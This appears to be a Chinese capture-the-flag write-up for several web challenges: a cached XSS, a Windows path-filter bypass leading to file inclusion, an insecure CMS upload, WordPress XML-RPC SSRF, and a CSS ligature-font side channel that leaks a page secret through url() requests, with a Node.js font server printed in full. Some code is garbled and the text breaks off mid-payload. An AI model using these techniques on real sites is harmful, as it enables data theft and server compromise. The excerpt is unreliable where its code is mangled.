# Web
## babylog
各种尝试后，发现可以利用缓存将 xff 头处的 self-xss 转为存储型 xss。  
## lfi2019
**SECOND BLOOD**
这个题目充满了出题人的恶趣味。没用的代码和注释实在太多了，我第一次感受到原来注释多也挺惹人烦的。其主要就两个功能：
  1. include文件。
  2. 写文件。
重点在于绕过它的各种限制，其对于文件有如下限制：
  1. 文件名不能出现`['.', './', '~', '.\\', '#', '']`中的任意一个字符
  2. 写文件的内容会被`preg_replace("/[^<>!@#$%\^&*\_?+\.\-\\\'\"\=\(\)\[\]\;]/u", "*Nope*", (string)$code);`处理。
在include文件前，其还有一个限制：
    $read_file = "./files/" . $this->filename;
    $read_file_with_hardened_filter = "./files/" . path_sanitizer($this->filename, true);
    /*
    path_sanitizer(true)会把所有的/和\替换为空：
    foreach(["/", "\\"] as $f){
      $dir = str_replace($f, "", $dir);
    }
    */
    if($read_file === $read_file_with_hardened_filter ||
       @file_get_contents($read_file) === @file_get_contents($read_file_with_hardened_filter)){
      return ["msg" => "request blocked", "type" => "error"];
    }
如果它是Linux服务器的话，很显然，直接上传一个文件名为`bb\`的文件就能绕过限制。但这题不行。经过对一些特殊字符（如下）的测试，发现这是一台Windows机器。
对于Windows的文件读取，有一个小Trick：使用`FindFirstFile`这个API的时候，其会把`"`解释为`.`。意即：`shell"php`
=== `shell.php`。
因此，回到这题来。我们上传一个文件，名字设为`test`。然后，通过`"/test`即可读取。此时：
    $read_file = "./files/./test";
    $read_file_with_hardened_filter = "./files/.test";
    file_get_contents($read_file) = '实际文件内容';
    file_get_contents($read_file_with_hardened_filter) = false //文件不存在
至此，即绕过了文件名的限制。至于文件内容的限制，更为简单了。
参考 
，编写payload如下：
其中用 `` 替代分号，最后运行的是`file_get_contents('flag.php')`，就能出结果了。
## weiphp
**FIRST BLOOD**
挺无聊的一个 CMS 审计题目。我还是第一次见到能有一个CMS 的开发者允许用户自己定义`allow_file_ext`的。
并且存在一个免验证的文件上传接口:
然后就没有然后了。
## babypress
注意到`docker-compose.yml`里把网卡设置为了外网地址。联想到 WordPress 的 xml-rpc 修复了各种内网SSRF，猜想就是通过
xml-rpc 打外网从而拿到 flag。于是直接用 xml-rpc 打就 ok。
## noxss
**FIRST BLOOD**
非常明显，唯一的输出点只有skin，但此输出点过滤掉了  " '
很显然，我们只能用 CSS 搞事情了。那第一步是如何执行我们需要的任意 CSS。
根据 CSS 标准：
CSS 会忽略所有的不正确的语法，就像这些东西从来没有存在过一样。因此，我们只需要换行，就可以让整个import 无效。  
让我们再往下看一下，CSS 如何换行：
其支持：%0a、%0d、%0f。%0a 会被Web服务器吃掉，因此使用 %0d 和 %0f 都可以逃逸出@import，从而实现执行任意 CSS 样式。
仔细读一下源码，就会发现，我们这题的目标是拿到这儿的 secret。
大家都知道，CSS 可以很容易地匹配到 attr，但是提取 content 就比较难了。CSS3
标准曾经有“:content”伪类，不过后来被删除，没进入正式标准，也没有浏览器支持它。因此，要得到这个值，只能使用一些Side-channel的非常规手段。CSS
的话，包括动画、字体等都是比较有效的侧信道攻击方案。不过，对于动画，我暂时想不到什么比较合适的方案；但是字体则可以利用“连字（Ligature）”进行侧信道。
我最早的思路是：
    @font-face {
      font-family: ligature;
      src: url(xxxxx);
    }
    @font-face {
      font-family: normal;
      src: url(xxxxx);
    }
    script {
      display: block;
      font-family: "ligature", "normal";
    }
构造一个连字字体，这个字体内只有“xctf”四个字符，如果浏览器只加载了这个字体，未加载normal字体，则证明页面内存在且 **仅存在**
“xctf”这四个字符。否则，则会加载normal字体。后发现该思路不对，因为script标签内字符实在太多，无法这么处理。
在这之后，我进行了一番搜索。查找到相关的一篇波兰语文章（别问我怎么搜到的.jpg）： 。
这篇文章的大致思路是：
  1. 构造一个字体，把所有字符的宽度都设置为0。
  2. 把“xctf”的宽度设置为10000。
  3. 当页面里出现“xctf”的时候，就会出现滚动条。
  4. 在滚动条的样式里，通过`background: url()`发送请求。
  5. 逐位爆破。
不过，原文的payload过于复杂，利用了包括缓存、二分爆破等一系列技术，实在是不好利用，我也没跑通。因此，我自己基于文章内提供的fontforge脚本重新写了一份payload。
首先是需要一个Nodejs Server（同原文），这个Server用于动态生成字体：
script.fontforge:
    #!/usr/bin/fontforge
    Open($1)
    Generate($1:r + ".woff")
index.js
    ➜  cat index.js
    const express = require('express');
    const app = express();
    // Serwer ExprssJS domyślnie dodaje nagłówek ETag,
    // ale nam nie jest to potrzebne, więc wyłączamy.
    app.disable('etag');
    const PORT = 23460;
    const js2xmlparser = require('js2xmlparser');
    const fs = require('fs');
    const tmp = require('tmp');
    const rimraf = require('rimraf');
    const child_process = require('child_process');
    // Generujemy fonta dla zadanego przedrostka
    // i znaków, dla których ma zostać utworzona ligatura.
    function createFont(prefix, charsToLigature) {
        let font = {
            "defs": {
                "font": {
                    "@": {
                        "id": "hack",
                        "horiz-adv-x": "0"
                    },
                    "font-face": {
                        "@": {
                            "font-family": "hack",
                            "units-per-em": "1000"
                        }
                    },
                    "glyph": []
                }
            }
        };
        // Domyślnie wszystkie możliwe znaki mają zerową szerokość...
        let glyphs = font.defs.font.glyph;
        for (let c = 0x20; c  {
            const glyph = {
                "@": {
                    "unicode": prefix + c,
                     "vert-adv-y": "10000",
                     "horiz-adv-x": "10000",
                     "d": "M0 10000,v 0 10000z",
                }
            }
            glyphs.push(glyph);
        });
        // Konwertujemy JSON-a na SVG.
        const xml = js2xmlparser.parse("svg", font);
        // A następnie wykorzystujemy fontforge
        // do zamiany SVG na WOFF.
        const tmpobj = tmp.dirSync();
        fs.writeFileSync(`${tmpobj.name}/font.svg`, xml);
        child_process.spawnSync("/usr/bin/fontforge", [
            `${__dirname}/script.fontforge`,
            `${tmpobj.name}/font.svg`
        ]);
        const woff = fs.readFileSync(`${tmpobj.name}/font.woff`);
        // Usuwamy katalog tymczasowy.
        rimraf.sync(tmpobj.name);
        // I zwracamy fonta w postaci WOFF.
        return woff;
    }
    // Endpoint do generowania fontów.
    app.get("/font/:prefix/:charsToLigature", (req, res) => {
        const { prefix, charsToLigature } = req.params;
        // Dbamy o to by font znalazł się w cache'u.
        res.set({
            'Cache-Control': 'public, max-age=600',
            'Content-Type': 'application/font-woff',
            'Access-Control-Allow-Origin': '*',
        });
        res.send(createFont(prefix, Array.from(charsToLigature)));
    });
    app.listen(PORT, () => {
        console.log(`Listening on ${PORT}...`);
    })
index.html:
    //const chars = ['t','f']
    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_'.split('')
    let ff = [], data = ''
    let prefix = 'xctf{dobra_robota_jestes_mistrzem_CSS}'
    chars.forEach(c => {
        var css = ''
        css = '?theme=../../../../\fa{}){}'